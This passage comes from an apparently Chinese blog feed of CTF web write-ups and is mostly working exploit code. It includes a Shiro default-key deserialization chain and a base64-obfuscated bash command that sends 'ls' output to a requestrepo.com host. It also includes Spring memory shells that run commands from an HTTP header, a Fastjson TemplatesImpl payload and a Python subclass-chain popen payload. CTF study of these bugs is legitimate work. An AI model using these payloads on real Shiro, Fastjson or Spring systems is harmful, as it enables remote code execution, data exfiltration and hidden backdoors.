class="hljs-type">AesCipherService</span> <span class="hljs-variable">aes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AesCipherService</span>();<br>        <span class="hljs-type">byte</span>[] key = Base64.getDecoder().decode(CodecSupport.toBytes(shiro_key));<br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br><br>        ByteSource ciphertext;<br>        ciphertext = aes.encrypt(bytes, key);<br>        System.out.println(ciphertext);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object object,String field_name,Object filed_value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;   <span class="hljs-comment">//反射修改属性值</span><br>        Class clazz=object.getClass();<br>        Field declaredField=clazz.getDeclaredField(field_name);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(object,filed_value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>runtime类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">runtime</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash -c &#123;echo,Y3VybCBgbHNgLm5ubmhoMWpiLnJlcXVlc3RyZXBvLmNvbQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>嗯。打不通，究其原因是因为这道题不出网。</p><p><strong>这道题的条件是传入Cookie的字符串要小于大约3500个字符，可以修改payload长度来控制cookie长度。</strong></p><p>把以下两个文件放在ysoserial整个工程文件里</p><p>首先<code>DynamicClassGenerator</code>用来生成恶意<code>class</code>，针对不同系统使用不同的方法即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.shiropoc;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicClassGenerator</span> &#123;<br>    <span class="hljs-keyword">public</span> CtClass <span class="hljs-title function_">genPayloadForWin</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, IOException &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Exp&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> ((clazz.getDeclaredConstructors()).length != <span class="hljs-number">0</span>) &#123;<br>            clazz.removeConstructor(clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>]);<br>        &#125;<br>        clazz.addConstructor(CtNewConstructor.make(<span class="hljs-string">&quot;public SpringEcho() throws Exception &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            try &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n&quot;</span> +<br>                <span class="hljs-string">&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                String te = httprequest.getHeader(\&quot;Host\&quot;);\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.addHeader(\&quot;Host\&quot;, te);\n&quot;</span> +<br>                <span class="hljs-string">&quot;                String tc = httprequest.getHeader(\&quot;CMD\&quot;);\n&quot;</span> +<br>                <span class="hljs-string">&quot;                if (tc != null &amp;&amp; !tc.isEmpty()) &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    String[] cmd = new String[]&#123;\&quot;cmd.exe\&quot;, \&quot;/c\&quot;, tc&#125;;  \n&quot;</span> +<br>                <span class="hljs-string">&quot;                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next().getBytes();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    httpresponse.getWriter().write(new String(result));\n&quot;</span> +<br>                <span class="hljs-string">&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().flush();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().close();\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &#125; catch (Exception e) &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                e.getStackTrace();\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;&quot;</span>, clazz));<br><br>        <span class="hljs-comment">// 兼容低版本jdk</span><br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">50</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> classPool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-keyword">return</span> clazz;<br>    &#125;<br>    <span class="hljs-keyword">public</span> CtClass <span class="hljs-title function_">genPayloadForLinux</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Exp&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> ((clazz.getDeclaredConstructors()).length != <span class="hljs-number">0</span>) &#123;<br>            clazz.removeConstructor(clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>]);<br>        &#125;<br>        clazz.addConstructor(CtNewConstructor.make(<span class="hljs-string">&quot;public SpringEcho() throws Exception &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            try &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n&quot;</span> +<br>                <span class="hljs-string">&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                String te = httprequest.getHeader(\&quot;Host\&quot;);\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.addHeader(\&quot;Host\&quot;, te);\n&quot;</span> +<br>                <span class="hljs-string">&quot;                String tc = httprequest.getHeader(\&quot;CMD\&quot;);\n&quot;</span> +<br>                <span class="hljs-string">&quot;                if (tc != null &amp;&amp; !tc.isEmpty()) &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    String[] cmd =  new String[]&#123;\&quot;/bin/sh\&quot;, \&quot;-c\&quot;, tc&#125;;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next().getBytes();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    httpresponse.getWriter().write(new String(result));\n&quot;</span> +<br>                <span class="hljs-string">&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().flush();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().close();\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;&quot;</span>, clazz));<br><br>        <span class="hljs-comment">// 兼容低版本jdk</span><br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">50</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> classPool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-keyword">return</span> clazz;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> shiropoc;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.CodecSupport;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> ysoserial.payloads.util.Reflections.setFieldValue;<br><br><span class="hljs-comment">//shiro无依赖利用链，使用shiro1.2.4自带的cb 1.8.3</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">POC</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        com.sun.org.apache.xalan.internal.xsltc.trax.<span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> getTemplate();<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>, String.CASE_INSENSITIVE_ORDER);<br>        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, comparator);<br>        <span class="hljs-comment">// stub data for replacement later</span><br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br><br>        setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates, templates&#125;);<br><br>        <span class="hljs-comment">// ==================</span><br>        <span class="hljs-comment">// 生成序列化字符串</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(queue);<br>        <span class="hljs-type">AesCipherService</span> <span class="hljs-variable">aes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AesCipherService</span>();<br>        <span class="hljs-type">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>));<span class="hljs-comment">//shiro默认密钥</span><br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br><br>        ByteSource ciphertext;<br>        ciphertext = aes.encrypt(bytes, key);<br>        System.out.println(ciphertext);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl <span class="hljs-title function_">getTemplate</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">DynamicClassGenerator</span> <span class="hljs-variable">classGenerator</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">DynamicClassGenerator</span>();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clz</span> <span class="hljs-operator">=</span> classGenerator.genPayloadForLinux();<br>        com.sun.org.apache.xalan.internal.xsltc.trax.<span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clz.toBytecode()&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行poc之后的cookie全部打进去，然后利用http头CMD来执行命令：</p><p><img src="/img/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240527202415287.png" alt="image-20240527202415287"></p><p>flag{d50d0c23-262d-4a16-1046-e55b27ff8f6b}</p><h1 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h1><p><img src="/img/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20241203161337576.png" alt="image-20241203161337576"></p><p>注意到<code>JSON.parseObject</code>同时设置了<code>SupportNonPublicField</code>支持非公共属性，所以可使用<code>TemplatesImpl</code>加载恶意字节码的形式回显利用。</p><p>payload：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>: [<span class="hljs-string">&quot;恶意类字节码&quot;</span>],<span class="hljs-string">&#x27;_name&#x27;</span>: <span class="hljs-string">&#x27;a.b&#x27;</span>,<span class="hljs-string">&#x27;_tfactory&#x27;</span>: &#123;&#125;,<span class="hljs-string">&quot;_outputProperties&quot;</span>: &#123;&#125;,<span class="hljs-string">&quot;_name&quot;</span>: <span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;_version&quot;</span>: <span class="hljs-string">&quot;1.0&quot;</span>,<span class="hljs-string">&quot;allowedProtocols&quot;</span>: <span class="hljs-string">&quot;all&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>shell.class：这里用回显内存马</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.Memshell.fastjson1_nei_chun_ma;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">shell</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            org.springframework.web.context.request.<span class="hljs-type">RequestAttributes</span> <span class="hljs-variable">requestAttributes</span> <span class="hljs-operator">=</span> org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();<br>            javax.servlet.http.<span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">httprequest</span> <span class="hljs-operator">=</span> ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();<br>            javax.servlet.http.<span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">httpresponse</span> <span class="hljs-operator">=</span> ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();<br>            String[] cmd =  <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, httprequest.getHeader(<span class="hljs-string">&quot;Infernity&quot;</span>)&#125;;  <span class="hljs-comment">//请求头加一个Infernity后面加命令</span><br>            <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmd).start().getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next().getBytes();<br>            httpresponse.getWriter().write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(result));<br>            httpresponse.getWriter().flush();<br>            httpresponse.getWriter().close();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span><br>            TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span><br><span class="hljs-params">                          SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>main.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> FiletoBase(<span class="hljs-string">&quot;C:\\Users\\13664\\Documents\\JavaUtils\\target\\classes\\com\\Memshell\\fastjson1_nei_chun_ma\\shell.class&quot;</span>);<br>        System.out.println(payload);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">FiletoBase</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(filename));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">encode</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(bytes);<br>        <span class="hljs-keyword">return</span> encode;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后把生成的恶意类字节码替换进payload就可以。</p><p><img src="/img/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20241203161828436.png" alt="image-20241203161828436"></p>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第九届中国海洋大学信息安全竞赛web题解</title>
    <link href="/2024/04/26/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/"/>
    <url>/2024/04/26/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="ezPHP"><a href="#ezPHP" class="headerlink" title="ezPHP"></a>ezPHP</h1><p>parse_str()可以进行变量覆盖。</p><p>全部流量包：</p><p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/fe922ff623f0ed59bc44e3ad44afdf21.png" alt="img"></p><h1 id="菜狗工具-1"><a href="#菜狗工具-1" class="headerlink" title="菜狗工具#1"></a>菜狗工具#1</h1><p>python继承链攻击。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(()</span></span>.__class__.__base__.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[132]</span>.__init__.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;popen&#x27;</span>]</span>(<span class="hljs-string">&#x27;cat app.py&#x27;</span>)<span class="hljs-selector-class">.read</span>())<br></code></pre></td></tr></table></figure><h1 id="爆率真的高"><a href="#爆率真的高" class="headerlink" title="爆率真的高"></a>爆率真的高</h1><h3 id="事前准备"><a href="#事前准备" class="headerlink" title="事前准备"></a>事前准备</h3><p>禁用了ctrl+U、F12、鼠标右键等操作，防止我们查看源码，这是JS造成的，我们先关闭浏览器的js，再查看源码或者打开开发者工具，最后重新打开js，刷新页面即可正常查看。</p><p>来看看前端源码：</p><p><img 